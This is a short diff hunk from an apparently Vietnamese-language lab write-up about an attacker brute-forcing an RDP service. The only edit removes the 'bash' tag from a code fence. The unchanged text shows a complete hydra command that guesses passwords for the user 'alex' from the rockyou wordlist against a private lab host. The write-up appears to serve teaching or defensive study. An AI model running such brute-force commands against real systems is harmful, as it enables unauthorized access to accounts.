@@ -10,7 +10,7 @@ Attacker sử dụng hydra brute force dịch vụ RDP trên 1 host dưới đâ
  
 **Trong đây giả sử attacker đã thu được username**
  
-```bash
+```
 sudo hydra -V -f -l alex -P '/home/kuga/rockyou.txt' rdp://192.168.188.40:3389  
 ```
 
